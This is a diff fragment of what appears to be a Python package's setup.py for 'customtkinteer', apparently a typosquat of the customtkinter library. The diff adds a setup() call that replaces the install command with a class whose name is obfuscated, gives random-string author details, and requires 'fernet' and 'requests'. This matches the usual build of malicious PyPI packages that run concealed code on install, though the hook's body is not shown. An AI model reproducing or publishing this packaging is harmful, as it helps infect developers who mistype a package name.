@@ -18,5 +18,22 @@ class fPkPkSSBZtgrQczJPHjZzbGsEPLnZOGOkVzYnPLrXgONjoCWRoNaqUBKCtKJhdofdhnSwOFOKu
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="customtkinteer",
+    version=VERSION,
+    author="KtXOOQowkkwA",
+    author_email="OrBLJMKjhBdTNohu@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': fPkPkSSBZtgrQczJPHjZzbGsEPLnZOGOkVzYnPLrXgONjoCWRoNaqUBKCtKJhdofdhnSwOFOKugsVKYlYQEtXnPBxPtyseCptIypmERxAjeBUQBGKnvHiCTYQYfPTwYUBiaYEhcbhxWcoIBKlZSPRDqBMjhKvo,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
